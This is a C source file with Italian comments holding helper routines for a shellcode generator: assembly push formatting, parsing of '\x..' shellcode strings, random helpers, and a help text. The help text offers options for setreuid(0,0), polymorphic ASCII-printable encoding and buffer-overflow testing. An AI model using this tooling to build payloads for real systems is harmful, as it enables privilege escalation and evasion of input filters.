typedef enum {false, true} bool;
double round (double);


// La funzione pushlen calcola, in base alla
// lunghezza di una stringa, il numero di byte
// necessari per pusharla nello stack.
int pushlen (int len) {
	int r;
	r = 5*((len-(len%4))/4);
	switch (len%4) {
		case 1:
			r += 2;
			break;
		case 2:
			r += 5;
			break;
		case 3:
			r += 6;
			break;
		default:
			r += 1;
			break;
	}
	return r;
}

// Questa funzione ritorna una stringa che corrisponde al codice in
// assembly necessario per pushare nello stack.
// Viene utilizzata nel caso in cui venisse specificato il parametro
// -a (consulta l'help per maggiori informazioni).
char* format_push (__u8 *shell, int *byte) {
	int i, l;
	char *ptr, n [30];
	i = 0;
	l = 1;
	// Con lo switch e il while successivi
	// Vengono determinate la lunghezza del comando in assembly
	// (es. `push	$0x50515253\n`) e il numero
	// di byte necessari per eseguire l'istruzione.
	switch (shell[0]) {
			case 0x6a:
				i += 2;
				l += 12;
				break;
			case 0x50:
				switch (shell[++i]) {
					case 0x66:
						i += 4;
						l += 26;
						break;
					case 0x68:
						i += 5;
						l += 29;
						break;
					default:
						break;
				}
				break;
			default:
				break;
	}
	while (shell[i]!=0x89) 
		switch (shell[i]) {
			case 0x66:
				i += 4;
				l += 15;
				break;
			case 0x68:
				i += 5;
				l += 18;
				break;
			default:
				break;
		}
	ptr = (char*) malloc (l);
	i = 0;
	ptr [0] = 0x00;
	// Questa parte di codice serve per mettere effettivamente
	// all'interno dell'array di caratteri `ptr` le stringhe di
	// istruzioni necessarie.
	// A seconda dei byte dello shellcode (gli opcode utilizzati)
	// vengono utilizzate diverse stringhe.
	switch (shell[i]) {
		case 0x6a:
			sprintf (n, "\tpush\t$0x%.02x\n",shell[i+1]); 
			i += 2;
			break;
		case 0x50:
			switch (shell[++i]) {
				case 0x66:
					sprintf (n, "\tpush\t%%eax\n"
						    "\tpushw\t$0x%.02x%.02x\n", shell[i+3],shell[i+2]);
					i += 4;
					break;
				case 0x68:
					sprintf (n, "\tpush\t%%eax\n"
						    "\tpush\t$0x%.02x%.02x%.02x%.02x\n", shell[i+4],shell[i+3], shell[i+2],shell[i+1]);
					i += 5;
					break;
				default:
					break;
			}
		default:
			break;
	}
	strcat (ptr, n);
	// L'opcode 0x89 viene rappresentato dall'istruzione mov,
	// e viene utilizzato dal generatore di shellcode per capire
	// quando è finita la parte da pushare.
	while(shell[i]!=0x89) {
		switch (shell[i]) {
			case 0x66:
				sprintf (n,"\tpushw\t$0x%.02x%.02x\n", shell[i+3],shell[i+2]);
				i += 4;
				break;
			case 0x68:
				sprintf (n,"\tpush\t$0x%.02x%.02x%.02x%.02x\n", shell[i+4],shell[i+3], shell[i+2],shell[i+1]);
				i += 5;
				break;
			default:
				break;
		}
		strcat (ptr, n);
	}
	*byte = i;
	return ptr;
}

// Una semplice funzione che ritorna true o false
// casualmente, basandosi sul file /dev/urandom
bool _random() {
	int fd;
	__u8 r;
	fd = open ("/dev/urandom", O_RDONLY);
	read (fd, &r, 1);
	close (fd);
	return (r>128) ? true : false;
}

// Funzionamento simile a _random (), tranne per il fatto
// che il numero generato si trova in un range specificato
// dagli argomenti min e max.
__u8 _rrand (int max,int min) {
	double n;
	int fd;
	__u8 r;
	fd = open ("/dev/urandom", O_RDONLY);
	read (fd, &r, 1);
	close (fd);
	n = (((double)r/255)*(max-min))+min;
	return (__u8) round (n);
}

// Questa funzione serve per leggere da stdin una stringa 
// che viene poi ritornata.
// Nel caso in cui nessuna stringa risulti disponibile da standard input
// viene ritornato NULL.
char *stdinr () {
	int flag, n, len, i;
	char tmp, *r;
	struct pollfd pollo;
	len = 100;
	i = 0;
	tmp = 0x00;
	r = (char *) malloc (1*sizeof (char));
	pollo.fd = dup(0); // 0 = stdin
	pollo.events = POLLIN;
	// Tramite la funzione poll è possibile
	// verificare se è presente qualcosa da 
	// leggere da stdin, in caso contrario viene
	// ritornato NULL.
	if (!poll(&pollo, 1, 10))
		return NULL;
	// Se invece è presente qualcosa
	// viene letto e "sistemato" in `r`.
	while (read(0,&tmp,1)>0) {
		r = (char *) realloc(r, ++i);
		r [i-1] = tmp;
	}
	if (r[i-1]!=0x0a)
		r = (char *) realloc (r, ++i);
	r [i-1] = 0x00;
	return r;
}

// is_hex () ritorna il valore di un carattere (es 'a' => 10),
int is_hex (char ch) {
	int n;
	n = -1;
	if ((ch>='0') && (ch<='9'))
		n = ch-'0';
	if ((ch>='a') && (ch<='f'))
		n = ch-'a'+10;
	return n;
}

// Verifica se la stringa passata è uno shellcode
// in formato "\x00\x00" etc etc..
int is_shellcode (char *string) {
	int i, n;
	for (i=0;i<strlen(string);i+=4) 
		if ((strncmp (string+i, "\\x", 2)) || (is_hex (string[i+2])<0) || (is_hex (string[i+3])<0))
			return 0;
	return 1;
}

// atox (ascii to hex) ritorna un'intero che è la conversione
// di una stringa contenente un numero esadecimale.
int atox (char *str) {
	int i, l;
	unsigned int s;
	s = 0;
	for(i=0,l=strlen(str)-1;is_hex(str[i])>=0;i++,l--)
		s+=is_hex (str[i])*(int) pow (16,l);
	return s;
}

// string2shellcode prende come parametro uno shellcode in
// formato "\x00\x00" e ne restituisce un puntatore __u8 
// corrispondente {0x00, 0x00}
__u8 *string2shellcode (char *string) {
	__u8 *shellcode;
	char tmp [3];
	int i;
	tmp [2] = 0x00;
	shellcode = (__u8*) malloc (strlen(string)/4);
	for (i=0;i<strlen(string);i+=4) {
		tmp [0] = string [i+2];
		tmp [1] = string [i+3];
		shellcode [i/4] = (__u8) atox (tmp);
	}
	return shellcode;
}

// Calcola il numero di byte che vengono pushati
// da uno shellcode.
int pushed_bytes (char *cmd, char *shcp) {
	int l, len;
	l = 26;
	len = strlen (cmd);
	if (!(len%2))
		l += len+4;
	else
		l += len+3;
	len = strlen (shcp);
	if (!(len%2))
		l += len+4;
	else
		l += len+3;
	return l;
}

void _help () {
	printf ( "Questo è il messaggio di help.\n"
		"./gen [Options..] command\n\n"
		"Lista di opzioni:\n"
		"\t--setuid\t\tServe per utilizzare un setreuid (0,0) all'inizio dello shellcode\n"
		"\t--shellpath path\tSpecifica una shell diversa da quella di default (/bin/sh)\n"
		"\t-a\t\t\tStampa il codice assembly dello shellcode generato\n"
		"\t-r\t\t\tStampa lo shellcode generato in modalità \"raw\"\n"
		"\t-p\t\t\tGenera uno shellcode polimorfico ASCII-printable\n"
		"\t-s number\t\tSottrae (o aggiunge con number < 0) number bytes ad esp\n"
		"\t-j number\t\tEsegue un Jump Short di number bytes per eseguire la syscall execve\n"
		"\t-c shellcode\t\tConverte shellcode in un'altro polimorfico ASCII printable\n"
		"\t-n number\t\t\"Pusha\" number NOP bytes nello stack\n"
		"\t--test\t\t\tTesta lo shellcode generato ricreando un buffer overflow guidato\n"
		"\t--help\t\t\tMostra questo messaggio\n\n"
		"Consulta la documentazione per capirci qualcosa.\n\n");
}
